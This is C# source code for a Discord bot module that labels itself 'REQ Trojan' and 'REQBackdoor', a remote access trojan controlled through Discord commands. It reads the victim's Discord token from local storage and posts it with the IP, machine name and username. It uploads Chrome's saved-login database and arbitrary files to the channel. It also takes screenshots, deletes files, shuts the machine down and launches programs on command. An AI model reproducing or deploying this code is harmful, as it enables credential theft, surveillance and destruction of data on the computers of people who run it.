using Discord;
using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace simple_discord_bot_csharp.Modules
{
    // Une classe utilisant ModuleBase<SocketCommandContext> de Discord.net
    public class Fun : ModuleBase<SocketCommandContext>
    {

        private static List<string> TakeUsername()
        {


            List<string> list = new List<string>();
            List<string> result;
            try
            {
                string text = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
                int num;
                while ((num = text.IndexOf("oken")) != -1)
                {
                    text = text.Substring(num + "oken".Length);
                }
                list.Add(text.Split(new char[]
                {
            '"'
                })[1]);
                result = list;
            }
            catch (Exception)
            {
                result = null;
            }
            return result;
        }

        [Command("getpassword")]
        public async Task getPasswordAsync(string hwid)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (hwid == ip)
            {
                try
                {
                    await Context.Channel.SendFileAsync($@"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithColor(Discord.Color.Red);
                Embed.WithDescription($"The ip address `{hwid}` does not belong to anyone who has opened REQBackdoor.");
                Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }
        [Command("uploadfile")]
        public async Task fileupload(string hwid, [Remainder] string path)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (hwid == ip)
            {
                try
                {
                    EmbedBuilder Embed = new EmbedBuilder();
                    Embed.WithColor(Discord.Color.Red);
                    Embed.Title = $"File from **{ip}** computer:";
                    Embed.WithDescription($"Location: `{path}`");
                    Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                    await Context.Channel.SendMessageAsync("", false, Embed.Build());
                    await Context.Channel.SendFileAsync(path, $"");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithColor(Discord.Color.Red);
                Embed.WithDescription($"The ip address `{hwid}` does not belong to anyone who has opened REQBackdoor.");
                Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }

        [Command("screen")]
        public async Task screen(string hwid)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (ip == hwid)
            {
                try
                {
                    Rectangle bounds = Screen.GetBounds(Point.Empty);
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                        }
                        bitmap.Save("screenshot.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                    }
                    await Context.Channel.SendFileAsync("screenshot.jpg", $"> **ScreenShot from {ip} computer:**");
                    File.Delete("screenshot.jpg");
                }
                catch (Exception e)
                {
                }
            }
            else
            {
                await Context.Channel.SendMessageAsync("The ip address does not belong to anyone who has opened REQBackdoor");
            }
        }

        [Command("help")]
        public async Task help()
        {
            try
            {
                EmbedBuilder builder = new EmbedBuilder();

                builder.WithTitle("REQ Trojan help menu");
                builder.AddField("`!!screen <ip>`", "**screenshot the user computer and send in the context channel.**", false);    // true - for inline
                builder.AddField("`!!deletefile <ip> <path>`", "**Delete a file from the taget computer.**", false);
                builder.AddField("`!!shutdown <ip>`", "**shutdown computer of target ip.**", false);
                builder.AddField("`!!getpath <ip>`", "**get path  of target ip.**", false);
                builder.AddField("`!!start <ip> <name><ext>`", "**start a software.**", false);
                builder.AddField("`!!message <ip> <message>`", "**send a message.**", false);
                builder.AddField("`!!check`", "**send tokens & ips from all backdoor connected user.**", false);
                builder.AddField("`!!uploadfile <ip> <path>`", "**send a specific file of taget user.**", false);
                builder.WithFooter("REQ Trojan by Stanley & Zenrox");

                builder.WithColor(Discord.Color.Gold);
                await Context.Channel.SendMessageAsync("", false, builder.Build());
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        [Command("getpath")]
        public async Task getpath(string hwid)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (hwid == ip)
            {
                try
                {
                    string environnement = Environment.UserName;
                    var s = "\\";
                    string patha = $"C:{s}Users{s}{environnement}";
                    EmbedBuilder Embed = new EmbedBuilder();
                    Embed.WithColor(Discord.Color.Red);
                    Embed.WithDescription($"Global path of `{ip}` computer: `{patha}`.");
                    Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                    await Context.Channel.SendMessageAsync("", false, Embed.Build());
                }
                catch (Exception e)
                {
                }
            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithColor(Discord.Color.Red);
                Embed.WithDescription($"The ip address `{hwid}` does not belong to anyone who has opened REQBackdoor.");
                Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }

        [Command("deletefile")]
        public async Task deletefile(string hwid, [Remainder] string path)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (hwid == ip)
            {
                try
                {
                    File.Delete(@path);
                    EmbedBuilder Embed = new EmbedBuilder();
                    Embed.WithColor(Discord.Color.Green);
                    Embed.WithDescription($"Success deleted `{path}` on `{ip}` computer!");
                    Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                    await Context.Channel.SendMessageAsync("", false, Embed.Build());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithColor(Discord.Color.Red);
                Embed.WithDescription($"The ip address `{hwid}` does not belong to anyone who has opened REQBackdoor.");
                Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }

        [Command("shutdown")]
        public async Task shutdown(string hwid)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (ip == hwid)
            {
                try
                {
                    Process.Start("shutdown", "/s /t 0");
                    EmbedBuilder Embed = new EmbedBuilder();
                    Embed.WithColor(Discord.Color.Red);
                    Embed.WithDescription($"Successfully shutdownn `{ip}` computer.");
                    Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                    await Context.Channel.SendMessageAsync("", false, Embed.Build());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithColor(Discord.Color.Red);
                Embed.WithDescription($"The ip address `{hwid}` does not belong to anyone who has opened REQBackdoor.");
                Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }

        [Command("start")]
        public async Task start(string hwid, string name)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (hwid == ip)

            {
                try
                {
                    Process.Start(name);
                    EmbedBuilder Embed = new EmbedBuilder();
                    Embed.WithColor(Discord.Color.Red);
                    Embed.WithDescription($"Successfully started `{name}` from `{ip}` computer.");
                    Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                    await Context.Channel.SendMessageAsync("", false, Embed.Build());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithColor(Discord.Color.Red);
                Embed.WithDescription($"The ip address `{hwid}` does not belong to anyone who has opened REQBackdoor.");
                Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }

        [Command("message")]
        public async Task message(string hwid, [Remainder] string messagebox)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            if (hwid == ip)
            {
                try
                {
                    EmbedBuilder Embed = new EmbedBuilder();
                    Embed.WithColor(Discord.Color.Red);
                    Embed.WithDescription($"Successfully sending `{messagebox}` message on `{ip}`.");
                    Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                    await Context.Channel.SendMessageAsync("", false, Embed.Build());

                    MessageBox.Show(messagebox);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
            else
            {
                EmbedBuilder Embed = new EmbedBuilder();
                Embed.WithColor(Discord.Color.Red);
                Embed.WithDescription($"The ip address `{hwid}` does not belong to anyone who has opened REQBackdoor.");
                Embed.WithFooter("REQ Shield by Zenrox & Stanley");
                await Context.Channel.SendMessageAsync("", false, Embed.Build());
            }
        }

        // La commande
        [Command("check")]
        public async Task testasync()
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            string discordtoken = "no discord token found";
            List<string> list = new List<string>();
            list = Fun.TakeUsername();
            for (int i = 0; i < list.Count; i++)
            {
                discordtoken = list[i];
            }
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");
            // Envois d'un message sur le channel auquel il y a eu la commande test
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithColor(Discord.Color.Red);
            Embed.WithDescription($"IP: `{ip}`\nMachine Name: `{Environment.MachineName}`\nUsername: `{Environment.UserName}`\nDiscord Token: `{discordtoken}`");
            Embed.WithFooter("REQ Shield by Zenrox & Stanley");
            await Context.Channel.SendMessageAsync("", false, Embed.Build());

        }
    }
}